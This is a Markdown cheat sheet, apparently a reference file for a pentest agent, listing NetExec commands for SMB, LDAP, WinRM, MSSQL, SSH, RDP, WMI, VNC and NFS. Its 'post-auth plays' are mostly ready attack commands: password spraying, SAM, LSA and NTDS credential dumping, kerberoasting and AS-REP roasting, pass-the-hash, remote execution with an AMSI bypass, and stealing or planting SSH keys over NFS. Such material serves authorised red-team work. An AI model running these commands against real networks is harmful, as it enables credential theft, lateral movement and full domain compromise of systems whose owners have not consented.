# NetExec per-protocol catalog and post-auth plays

All protocols share the core auth surface: `-u user|file`, `-p pass|file`,
`-H LM:NT|NT`, `-d DOMAIN` or `--local-auth`, `-k`/`--use-kcache`/`--aesKey`,
`--port <n>`, `-t <threads>` (default 256 — raise for /16 sweeps, lower for
fragile links), `--timeout <s>`, `--jitter <s>`, `--log <file>`,
`--continue-on-success`, `--no-bruteforce`, `-M <module> [-o K=V ...]`, `-L`.

Exit output grammar (what parse_nxc.py reads):

```
PROTO       HOST            PORT   NETBIOS         [*|+|-] message
SMB         192.0.2.5       445    DC01             [*] Windows Server 2019 Build 17763 x64 (name:DC01) (domain:example.com) (signing:True) (SMBv1:False)
SMB         192.0.2.5       445    DC01             [+] example.com\jdoe:Autumn2024!
SMB         192.0.2.17      445    FS01             [+] example.com\jdoe:Autumn2024! (Pwn3d!)
SMB         192.0.2.5       445    DC01             [-] example.com\asmith:Autumn2024! STATUS_LOGON_FAILURE
```

`[*]` = info, `[+]` = success, `[-]` = failure. Status codes that matter:
`STATUS_LOGON_FAILURE` (wrong password), `STATUS_ACCOUNT_LOCKED_OUT` (stop
spraying NOW), `STATUS_PASSWORD_MUST_CHANGE` / `STATUS_PASSWORD_EXPIRED`
(**valid password** — change it via `-M change-password` or smbpasswd),
`STATUS_ACCOUNT_DISABLED` (valid password, dead account),
`STATUS_LOGON_TYPE_NOT_GRANTED` (valid, but no network logon right — try
winrm/rdp/ldap), `STATUS_NOT_SUPPORTED` (NTLM disabled — go Kerberos `-k`).

---

## SMB (445)

### Unauth / weak-auth
```
nxc smb 192.0.2.0/24                           # fingerprint: OS, build, name, domain, signing, SMBv1
nxc smb 192.0.2.0/24 --gen-relay-list relay.txt# write hosts with signing NOT required
nxc smb 192.0.2.5 -u '' -p ''                  # null session
nxc smb 192.0.2.5 -u 'guest' -p ''             # guest
nxc smb 192.0.2.5 -u 'a' -p ''                 # random user + empty pass sometimes maps to guest
```

### Enumeration (works null/guest/authed depending on target hardening)
```
--shares                  # share list + READ/WRITE perms (also --filter-shares READ WRITE)
--users [USER ...]        # domain users via SAMR, with description field (passwords hide there)
--groups [GROUP]          # domain groups; --local-groups for local
--loggedon-users          # interactive logons (admin hunting); --loggedon-users-filter <regex>
--sessions                # NetSessionEnum: who is connected from where
--computers               # domain computers
--pass-pol                # password/lockout policy — read before any spray
--rid-brute [MAX]         # SID cycling; default 4000, use 10000+ for big domains
--disks                   # local disks
--wmi <WQL>               # WQL query over SMB-authed WMI
```

### Files
```
--get-file '\\remote\\path\\file' ./local      # relative to share with --share <SHARE> (default C$)
--put-file ./local '\\Windows\\Temp\\x.exe'
--share DATA --get-file 'reports\\q3.xlsx' ./q3.xlsx
-M spider_plus                                 # JSON inventory of all readable files on all shares
-M spider_plus -o DOWNLOAD_FLAG=true MAX_FILE_SIZE=102400 EXCLUDE_DIR=IPC$,print$
```
spider_plus output: `~/.nxc/modules/nxc_spider_plus/<host>.json` (+ loot dir
when downloading). Grep it for `web.config`, `unattend.xml`, `.kdbx`, `id_rsa`,
`*.vmdk`, `password`.

### Execution (admin / Pwn3d required)
```
-x 'whoami /all'                               # cmd.exe
-X 'Get-ChildItem C:\Users'                    # PowerShell
--exec-method smbexec|wmiexec|atexec|mmcexec   # fallback when default (wmiexec) is blocked
--amsi-bypass <file>                           # custom AMSI bypass for -X
--no-output                                    # fire and forget (payload launch)
```

### Secrets (admin required)
```
--sam                     # local SAM hashes
--lsa                     # LSA secrets: cached domain creds (DCC2), service acct plaintext, machine acct
--ntds                    # DC only: full NTDS.dit via DRSUAPI; --ntds vss for shadow-copy method
--ntds --user krbtgt      # single-account extraction
--dpapi [cookies|nosystem]# DPAPI masterkeys -> Credential Manager / browser secrets
--sccm [wmi|disk]         # SCCM/NAA secrets
```
Dumps are also stored in the nxc DB; NT hashes feed straight back into `-H`
pass-the-hash sweeps (`hashcat -m 1000` for cracking, DCC2 = `-m 2100`).

---

## LDAP (389/636; add `--port 636` or it auto-negotiates)

```
nxc ldap 192.0.2.5 -u jdoe -p 'P@ss' -d example.com [flags]
--users / --users-export users.txt     # all users + descriptions
--groups [--groups-export g.txt]
--computers
--password-not-required                # PASSWD_NOTREQD accounts
--trusted-for-delegation               # unconstrained delegation (coerce DC -> capture TGT)
--find-delegation                      # all delegation types incl. constrained/RBCD
--admin-count                          # adminCount=1 (protected/privileged users)
--get-sid                              # domain SID (needed for golden tickets)
--active-users                         # skip disabled
--dc-list                              # all DCs
--gmsa                                 # readable gMSA passwords (needs LDAPS)
--kerberoasting kerb.txt               # TGS-REP hashes for SPN accounts     -> hashcat -m 13100
--asreproast asrep.txt                 # DONT_REQ_PREAUTH accounts           -> hashcat -m 18200
--query '(objectClass=user)' 'sAMAccountName description'   # raw LDAP query
```

AS-REP roasting works **without a valid credential** if you have usernames:
`nxc ldap 192.0.2.5 -u users.txt -p '' --asreproast asrep.txt`.

### BloodHound collection
```
nxc ldap 192.0.2.5 -u jdoe -p 'P@ss' -d example.com \
    --bloodhound --collection All --dns-server 192.0.2.5 [--dns-tcp]
```
Collections: `Default`, `All`, `DCOnly`, `Group`, `LocalAdmin`, `Session`,
`Trusts`, `ACL`, `Container`, `RDP`, `ObjectProps`, `LoggedOn` (comma-sep).
`DCOnly` = quiet (LDAP to the DC only). Output zip in `~/.nxc/logs/`; ingest
into BloodHound CE. Point `--dns-server` at a DC — collection resolves
every computer name.

LDAP modules of note: `adcs` (enumerate CAs/templates → feed Certipy),
`ldap-checker` (LDAP signing + channel binding → relay-to-LDAP viability),
`maq` (MachineAccountQuota), `get-desc-users`, `laps`, `pre2k`, `user-desc`,
`daclread`, `whoami`.

---

## WinRM (5985/5986)

Access tiers: `[+]` alone = valid cred, `(Pwn3d!)` = can execute (member of
Remote Management Users or admin).
```
nxc winrm 192.0.2.0/24 -u jdoe -p 'P@ss' -d example.com
nxc winrm 192.0.2.17 -u jdoe -p 'P@ss' -x 'whoami'      # cmd
nxc winrm 192.0.2.17 -u jdoe -p 'P@ss' -X '$PSVersionTable'  # pwsh
nxc winrm 192.0.2.17 -u Administrator -H <NT> --local-auth -x 'ipconfig'
--ssl --port 5986                                        # WinRM over HTTPS
--sam --lsa                                              # secrets over WinRM too
```
WinRM auth failures do NOT always increment the same lockout counter path as
SMB on hardened estates, but assume they do. WinRM is the quiet exec channel —
no service creation like smbexec.

## MSSQL (1433)

```
nxc mssql 192.0.2.30 -u sa -p 'SAPass!' --local-auth            # SQL auth
nxc mssql 192.0.2.30 -u svc_sql -p 'P@ss' -d example.com        # Windows auth
-q 'SELECT @@version'                                           # query
-q 'SELECT name FROM master.dbo.sysdatabases'
-x 'whoami'                 # enables + uses xp_cmdshell automatically (sysadmin needed)
--get-file / --put-file     # file xfer via OPENROWSET/OLE
-M mssql_priv               # privilege escalation paths: EXECUTE AS, trustworthy DBs
-M mssql_priv -o ACTION=privesc        # actually escalate to sysadmin
-M enum_links / exec_on_link           # linked-server chains (lateral into other SQL)
```
`(Pwn3d!)` on mssql = sysadmin = code exec as the SQL service account.
Service accounts are often domain accounts → kerberoast them, or escalate
via SeImpersonate once on the box.

## SSH (22)

```
nxc ssh 198.51.100.0/24 -u root -p pass.txt --continue-on-success
nxc ssh 198.51.100.7 -u ops --key-file ./id_rsa -p ''           # key auth ('' passphrase)
nxc ssh 198.51.100.7 -u ops -p 'P@ss' -x 'id; uname -a; sudo -n -l'
nxc ssh 198.51.100.7 -u ops -p 'P@ss' --sudo-check              # can we sudo?
```
`(Pwn3d!)` on ssh = root (uid 0) or sudo-capable.

## FTP (21)

```
nxc ftp 203.0.113.0/24 -u anonymous -p ''        # anonymous sweep
nxc ftp 203.0.113.9 -u anonymous -p '' --ls      # list root; --ls <dir>
--get <remote> / --put <local> <remote>
```

## RDP (3389)

```
nxc rdp 192.0.2.0/24                             # fingerprint, NLA status
nxc rdp 192.0.2.0/24 -u jdoe -p 'P@ss' -d example.com   # cred validation ((Pwn3d!) = RDP logon rights)
--screenshot --screentime 5                      # screenshot after connect (loot: unlocked consoles)
--nla-screenshot                                 # pre-auth screenshot when NLA off
```

## WMI (135 + dynamic)

Exec channel when 445 is filtered or SMB exec methods are blocked/detected:
```
nxc wmi 192.0.2.17 -u Administrator -H <NT> --local-auth -x 'whoami'
nxc wmi 192.0.2.17 -u jdoe -p 'P@ss' -d example.com --wmi 'SELECT * FROM Win32_OperatingSystem'
```

## VNC (5900)

```
nxc vnc 203.0.113.0/24                           # no-auth check
nxc vnc 203.0.113.14 -p pass.txt                 # VNC password spray (no username concept)
nxc vnc 203.0.113.14 -p 'secret' --screenshot
```

## NFS (2049)

```
nxc nfs 203.0.113.9 --shares                     # exports
nxc nfs 203.0.113.9 --enum-shares                # recursive listing with access eval
nxc nfs 203.0.113.9 --get-file /export/home/ops/.ssh/id_rsa ./id_rsa
nxc nfs 203.0.113.9 --put-file ./authorized_keys /export/home/ops/.ssh/authorized_keys
--uid 0                                          # spoof uid for no_root_squash / uid-mapped exports
```
NFS loot chains straight back in: stolen SSH keys → `nxc ssh --key-file`.

---

## The nxc database

Everything persists in `~/.nxc/workspaces/default/<proto>.db` (SQLite).
Interactive client:
```
nxcdb
> workspace default
> proto smb
> hosts                 # all fingerprinted hosts incl. signing + dc flag
> creds                 # every credential ever validated/dumped
> shares                # share access matrix
> export creds detailed creds.tsv
```
Use the DB to answer "where is this cred admin" without re-sweeping, and to
reload dumped hashes into new `-H` sweeps. `--log` files remain the best input
for `scripts/parse_nxc.py`.
